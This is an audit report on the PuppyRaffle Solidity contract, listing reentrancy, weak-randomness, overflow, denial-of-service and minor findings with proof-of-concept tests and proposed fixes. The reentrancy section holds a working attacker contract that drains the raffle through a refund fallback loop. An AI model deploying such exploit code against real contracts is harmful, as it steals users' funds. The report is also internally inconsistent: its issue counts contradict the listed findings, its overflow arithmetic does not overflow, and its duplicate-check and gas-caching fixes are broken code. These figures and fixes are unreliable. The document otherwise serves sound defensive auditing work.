---
title: Puppy Raffle Audit Report
author: Cryptab
date: Nov, 14, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Puppy Raffle Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Cryptab\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Cryptab](https://cryptab.io)
Lead Auditors: 
- Adam B

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance](#h-1-reentrancy-attack-in-puppyrafflerefund-allows-entrant-to-drain-raffle-balance)
    - [\[H-2\] Weak Randomness in `PuppyRaffle:selectwinner` allows users to influence or predict the winner and influence/predict winning puppy](#h-2-weak-randomness-in-puppyraffleselectwinner-allows-users-to-influence-or-predict-the-winner-and-influencepredict-winning-puppy)
    - [\[H-3\] Integar overflow of `PuppyRaffle::totalFees` loses fees](#h-3-integar-overflow-of-puppyraffletotalfees-loses-fees)
  - [Medium](#medium)
    - [\[M-1\] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incremeting gas costs for future entrants](#m-1-looping-through-players-array-to-check-for-duplicates-in-puppyraffleenterraffle-is-a-potential-denial-of-service-dos-attack-incremeting-gas-costs-for-future-entrants)
    - [\[M-2\] Unsafe cast of `PuppyRaffle::fee` loses fees](#m-2-unsafe-cast-of-puppyrafflefee-loses-fees)
    - [\[M-3\] Smart contract wallet raffle winners without a `receive` or `fallback` function will block the start of a new contest](#m-3-smart-contract-wallet-raffle-winners-without-a-receive-or-fallback-function-will-block-the-start-of-a-new-contest)
  - [Low](#low)
    - [\[L-1\] `PuppyRaffle:getActivePlayerIndex` returns 0 for non-existant players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle](#l-1-puppyrafflegetactiveplayerindex-returns-0-for-non-existant-players-and-for-players-at-index-0-causing-a-player-at-index-0-to-incorrectly-think-they-have-not-entered-the-raffle)
    - [\[L-2\] Centralization Risk for trusted owners](#l-2-centralization-risk-for-trusted-owners)
    - [\[L-3\] Solidity pragma should be specific, not wide](#l-3-solidity-pragma-should-be-specific-not-wide)
    - [\[L-4\] Missing checks for `address(0)` when assigning values to address state variables](#l-4-missing-checks-for-address0-when-assigning-values-to-address-state-variables)
    - [\[L-5\] `public` functions not used internally could be marked `external`](#l-5-public-functions-not-used-internally-could-be-marked-external)
    - [\[L-6\] Define and use `constant` variables instead of using literals](#l-6-define-and-use-constant-variables-instead-of-using-literals)
    - [\[L-7\] Event is missing `indexed` fields](#l-7-event-is-missing-indexed-fields)
    - [\[L-8\] Loop contains `require`/`revert` statements](#l-8-loop-contains-requirerevert-statements)
- [Gas](#gas)
  - [\[G-1\] Unchanged state variables should be delcared constant or immutable](#g-1-unchanged-state-variables-should-be-delcared-constant-or-immutable)
    - [\[G-2\] Storage variables in a loop should be cached](#g-2-storage-variables-in-a-loop-should-be-cached)
    - [\[I-1\] Solidity pragma should be specific, not wide](#i-1-solidity-pragma-should-be-specific-not-wide)
    - [\[I-2\] Using an outdated version of solidity is not recommended](#i-2-using-an-outdated-version-of-solidity-is-not-recommended)
    - [\[I-3\] Missing checks for `address(0)` when assigning values to address state variables](#i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables)
    - [\[I-4\] `PuppyRaffle::selectWinner` Doesn't follow CEI, which is not best practice](#i-4-puppyraffleselectwinner-doesnt-follow-cei-which-is-not-best-practice)
    - [\[I-5\] Use of magic numbers is discouraged](#i-5-use-of-magic-numbers-is-discouraged)
    - [\[I-6\] State changes are missing events](#i-6-state-changes-are-missing-events)
    - [\[I-7\] `PuppyRaffle::_isActivePlayer` is never used and should be removed](#i-7-puppyraffle_isactiveplayer-is-never-used-and-should-be-removed)

# Protocol Summary

This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

1. Call the `enterRaffle` function with the following parameters: 
   1. `address[] participants`: A list of addresses that enter. You can use 
      this to enter yourself multiple times, or yourself and a group of friends.
2. Duplicate addresses are not allowed.
3. Users are allowed to get a `refund` of their ticket & `value` if they call the `refund` function.
4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy.
5. The owner of the protocol will set a `feeAddress` to take a cut of the `value`, and the rest of the funds
will be sent to the winner of the puppy. 

# Disclaimer

The Cryptab team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 
- Commit hash: e30d199697bbc822b64d76533b66b7d529b8ef5
  
## Scope 

```
./src/
#--PuppyRaffle.sol
```
## Roles
Owner - Deployer of the protocol, has the power to change the wallet address
to which fees are sent through the `changeFeeAddress` function.

Player - Participant of the raffle, has the power to enter the raffle with
the `enterRaffle` function and refund value through `refund` function. 

# Executive Summary

Interesting protocol with an old codebase using an old version of solidity, cool to audit though!

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 4                      |
| Medium   | 3                      |
| Low      | 0                      |
| Info     | 7                      |
| Gas      | 1                      |
| Total    | 15                     |


# Findings
## High

### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

**Description**
Thr `PuppyRaffle::refund` function does not follow CEI (checks, effects, interactions).
As a result it enables participants to drain the contract balance. 

In the `PuppyRaffle::refund` function, we first need to kmake an external call to the `msg.sender`
address and only after making the external call do we update the `PuppyRafle::players` array.

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    } 
```

A player who has entered the raffle could have a `fallback/receive` function that calls
the `PuppyRaffle::refund` function again  and claim another refund. They could continue
the cycle till the contract balance is drained. 

**Impact**
All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept**

1. User enters raffle 
2. Attacker sets up up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attacl contract, draining the contract balance

**Proof of Code**

<details>
<summary>Code</summary>

Place the following into `PuppyRaffle.t.sol` 

```javascript
    function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance; 
        uint256 startingContractBalance = address(puppyRaffle).balance;

        // Attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("Starting attacker contract balance: ", startingAttackContractBalance);
        console.log("Starting contract balance: ", startingContractBalance);

        console.log("Ending attacker contract balance: ", address(attackerContract).balance);
        console.log("Ending contract balance: ", address(puppyRaffle).balance);
    }
```

And this contract as well

```javascript
    contract ReentrancyAttacker {
       PuppyRaffle puppyRaffle;
       uint256 entranceFee;
       uint256 attackerIndex;

       constructor(PuppyRaffle _puppyRaffle) {
           puppyRaffle = _puppyRaffle;
           entranceFee = puppyRaffle.entranceFee();
       }

       function attack() external payable {
           address[] memory players = new address[](1);
           players[0] = address(this);
           puppyRaffle.enterRaffle{value: entranceFee}(players);

           attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
           puppyRaffle.refund(attackerIndex);
       }

       function _stealMoney() internal {
           if(address(puppyRaffle).balance >= entranceFee) {
               puppyRaffle.refund(attackerIndex);
           }  
       }

       fallback() external payable {
           _stealMoney();
       }

       receive() external payable {
           _stealMoney();
       }
   }
```

</details>

**Recommended Mitigation**
To prevent this, we should have the `PuppyRaffle:refund` function update the `players` array before making the external call.
Additionally, we should move the event emission up as well. 

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    } 
```

### [H-2] Weak Randomness in `PuppyRaffle:selectwinner` allows users to influence or predict the winner and influence/predict winning puppy

**Description:** 
Hashing `msg.sender`, `block.timestamp` and `block.difficulty` together creates a predictable find number. A predictable number
is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle.

*Note:* This additionally means users could front-run this function and call `refund` if they see they are not the winner.

**Impact:** 
Any user can influence the winner of the raffle, winning the raffle and selecting the `rarest` puppy. Making the enitre raffle
worthless if it becomes a gas was as to who wins the raffles.

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate.
See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevandao). `block.difficulty` was recently replaced with
prevrandao
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!
3. Users can revert their `selectWinner` transaction if they don't like the winner or puppy. 

Using on-chain values as a randomness seed is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf)
in the blockchain space

**Recommended Mitigation:** 
Consider using a cryptographically provable random number generator such as Chainlink VRF


### [H-3] Integar overflow of `PuppyRaffle::totalFees` loses fees 

**Description:** 
In solidity versions prior to `0.8.0` integers were subject to integer overflows. 

```javascript
uint64 myVar = type(uint64).max
// 18446744073709551615
myVar = myVar + 1;
// myVar will be 0
```

**Impact:**  
In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect
later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the
`feeAddress may not collect the correct amount of fees, leaving fees permanently stuck in the
contract. 

**Proof of Concept:**
1. When we conclude a raffle of 4 players
2. We then have 89 players enter a new raffle, and conclude the raffle
3. `totalFees` will be:
```javascript
totalFees = totalFees + uint64(fee);
// aka
totalFees = 800000000000000000 + 1780000000000000000
// and this will overflow
totalFees = 153255926290448384
```
1. You will not be able to withdraw, due to the line inn `PuppyRaffle::withdrawFees`

```
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw
the fees, this is clearly not the intended design of the protocol. At some point, there will be too much `balance`
in the contract that the above `require` will be impossible to hit.

<details>
<summary>Code</summary>

```javascript
    function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

```
</details>

**Recommended Mitigation:** 
There are a few possible mitigations
1. Use a newer version of solidity and a `uint256` instead of `uint64` for `PuppyRaffle::totalFees`
2. You could also use the `SafeMath` library of OpenZeppelin for verison 0.7.6 of solidity,
however you would still have a hard time with the `uint64` type if too many fees are collected. 
1. Remove the balance check from `PuppyRaffle::withdrawFees`

```diff
-     require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

There are more attack vectors with that final require, so we recommend removing it regardless.

## Medium

### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incremeting gas costs for future entrants

IMPACT: MEDIUM
LIKELIHOOD: MEDIUM

**Description:** 
The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the
`PuppyRaffle:enterRaffle` array is, the more checks a new player will have to make. This means the gas costs for players who
enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the 
`players` array, is an additional check the loop will have to make. 

```javascript

for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** 
The gas cost for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering,
and causing a rush at the start of a raffle to be one of the first entrants in the queue. 

An attacker might make the `PuppyRaffle::entrants` array so big, that no one else enters, guaranteeing themselves the win

**Proof of Concept:**

If we have 2 sets of 100 players, the gas costs will be as such:
- 1st 100 players = 6252128
- 2nd 100 players = 18068218
  
This is 3x more expensive for the second 100 players 

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol

```javascript
function test_denialOfService() public {
        vm.txGasPrice(1);

        // test first 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for(uint i = 0; i < playersNum; i++) {
            players[i] = address(i);
        } 
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of first 100 players: ", gasUsedFirst);
        
        // 2nd 100 players
        address[] memory playersTwo = new address[](playersNum);
        for(uint i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        } 
        // check how much gas it costs 
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();

        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("Gas cost of second 100 players: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }

```

</details>


**Recommended Mitigation:** 
There are a few recommendations:
1. Consider allowing duplicates. Users can make new wallet addresses anyway, 
so a duplicate wont stop someone entering twice.
2. Considering using a mapping to check for duplicates. This would allow constant 
time lookup of whether a user has already entered. 

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library] 
https://docs.openzeppelin.com/contracts/3.x/api/utils 

### [M-2] Unsafe cast of `PuppyRaffle::fee` loses fees

**Description:** 
In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast,
and if the `uint256` is larger than a `type(uint64).max`, the value will be truncated. 

```javascript
        function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. Interms of ETH, this is ~`18` ETH. Meaning, if more than 18ETH of fees are collected,
the `fee` casting will truncate the value.

**Impact:** 
This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract. 

**Proof of Concept:**
1. A raffle proceeds with a little more than 18ETH worth of fees collected.
2. The line that casts the `fee` as a `uint64` hits.
3. `totalFees` is incorrectly updated with a lower amount.

You can replicate this in foundry's chisel by running the following:

```javascript
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**Recommended Mitigation:** 
Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment stating:
```javascript
// We do some storage packing to save gas
```
But the potential gas saved isn't worth it if we have to recast and this bug exists. 

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

### [M-3] Smart contract wallet raffle winners without a `receive` or `fallback` function will block the start of a new contest

**Description:** 
The `PuppyRaffle::selectWinner` function is responsible for restting the lottery. However, if the winner is a smart contract
wallet that rejects payment, the lottery would not be able to restart. 

Users could easily call the `selectWinner` function again and non-wallet entrants could enter, but it could cost a lot
due to the duplicate check and a lottery reset could get very challenging. 

**Impact:** 
The `PuppyRaffle::selectWinner` function could revert many times, making a lottery reset difficult.

Also winners would not even get paid out and someone else could take their money!

**Proof of Concept:**
1. 10 smart contract wallets enter the lottery without a `fallback` or `receive` function.
2. The lottery ends.
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** 
There are a few options to mitigate this issue:

1. Do not allow smart contract entrants (not recommended).
2. Create a mapping of addresses -> payout amounts so winners can pull their funds out
themselves with a new `claimPrize` function, putting the owness on the winner to claim 
their prize. (Recommended)

> Pull over Push

## Low

### [L-1] `PuppyRaffle:getActivePlayerIndex` returns 0 for non-existant players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle

**Description:** 
If a player is in the `PuppyRaffle::players` array at index 0, this will return 0,
but according to the natspec, it will also return 0 if the player is not in the array. 

```javascript
    /// @return the index of the player in the array, if they are not active it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
```

**Impact:** 
A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again,
wasting gas. 

**Proof of Concept:**

1. User enters the raffle, they are the first entrant 
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they haven't entered correctly due to function docs

**Recommended Mitigation:** 
- Easiest recommendation would be to revert if the player is not in the array instead of returning 0.
- You could also reserve the 0th position for any competition. 
- Best solution might be to return a `int256` where the function returns -1 if the player is not active. 

### [L-2] Centralization Risk for trusted owners

Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 20](src/PuppyRaffle.sol#L20)

	```solidity
	contract PuppyRaffle is ERC721, Ownable {
	```

- Found in src/PuppyRaffle.sol [Line: 208](src/PuppyRaffle.sol#L208)

	```solidity
	    function changeFeeAddress(address newFeeAddress) external onlyOwner {
	```

</details>



### [L-3] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

</details>



### [L-4] Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 70](src/PuppyRaffle.sol#L70)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 209](src/PuppyRaffle.sol#L209)

	```solidity
	        feeAddress = newFeeAddress;
	```

</details>



### [L-5] `public` functions not used internally could be marked `external`

Instead of marking a function as `public`, consider marking it as `external` if it is not used internally.

<details><summary>3 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 87](src/PuppyRaffle.sol#L87)

	```solidity
	    function enterRaffle(address[] memory newPlayers) public payable {
	```

- Found in src/PuppyRaffle.sol [Line: 106](src/PuppyRaffle.sol#L106)

	```solidity
	    function refund(uint256 playerIndex) public {
	```

- Found in src/PuppyRaffle.sol [Line: 234](src/PuppyRaffle.sol#L234)

	```solidity
	    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
	```

</details>



### [L-6] Define and use `constant` variables instead of using literals

If the same constant literal value is used multiple times, create a constant state variable and reference it throughout the contract.

<details><summary>3 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 156](src/PuppyRaffle.sol#L156)

	```solidity
	        uint256 prizePool = (totalAmountCollected * 80) / 100;
	```

- Found in src/PuppyRaffle.sol [Line: 157](src/PuppyRaffle.sol#L157)

	```solidity
	        uint256 fee = (totalAmountCollected * 20) / 100;
	```

- Found in src/PuppyRaffle.sol [Line: 174](src/PuppyRaffle.sol#L174)

	```solidity
	        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
	```

</details>



### [L-7] Event is missing `indexed` fields

Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

<details><summary>3 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 61](src/PuppyRaffle.sol#L61)

	```solidity
	    event RaffleEnter(address[] newPlayers);
	```

- Found in src/PuppyRaffle.sol [Line: 62](src/PuppyRaffle.sol#L62)

	```solidity
	    event RaffleRefunded(address player);
	```

- Found in src/PuppyRaffle.sol [Line: 63](src/PuppyRaffle.sol#L63)

	```solidity
	    event FeeAddressChanged(address newFeeAddress);
	```

</details>



### [L-8] Loop contains `require`/`revert` statements

# Gas

## [G-1] Unchanged state variables should be delcared constant or immutable 

Reading from state is much more expensive than reading from a constant or immutable variable 

Instances:
-`PuppyRaffle::raffleDuration` should be `immutable` 
-`PuppyRaffle::commonImageUri` should be `constant`
-`PuppyRaffle::rareImageUri` should be `constant`
-`PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] Storage variables in a loop should be cached

Every time you call `players.length` you read from storage, as opposed to memory which is more 
gas efficient

```diff
+        uint256 playersLength = players.length
-        for (uint256 i = 0; i < players.length - 1; i++) {
+         for (uint256 i = 0; i < players.length - 1; i++) {   
-            for (uint256 j = i + 1; j < players.length; j++) {
+            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```


### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)


### [I-2] Using an outdated version of solidity is not recommended

Please use a newer version such as `0.8.18`

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**:

Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [slither][https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity] documentation for more information

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 70](src/PuppyRaffle.sol#L70)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 209](src/PuppyRaffle.sol#L209)

	```solidity
	        feeAddress = newFeeAddress;
	```

</details>

### [I-4] `PuppyRaffle::selectWinner` Doesn't follow CEI, which is not best practice

It's best to keep code clean and follow CEI

```diff
-       (bool success,) = winner.call{value: prizePool}("");
-       require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+       (bool success,) = winner.call{value: prizePool}("");
+       require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### [I-5] Use of magic numbers is discouraged

It can be confusing to see number literals in a codebase, and it's much more 
readable if the numbers are given a name.

Examples:
```javascript
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
```
Instead you could use:
```javascript
        uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
        uint256 public constant FEE_PERCENTAGE = 20;
        uint256 public constant POOL_PRECISION = 100;
```

### [I-6] State changes are missing events


### [I-7] `PuppyRaffle::_isActivePlayer` is never used and should be removed

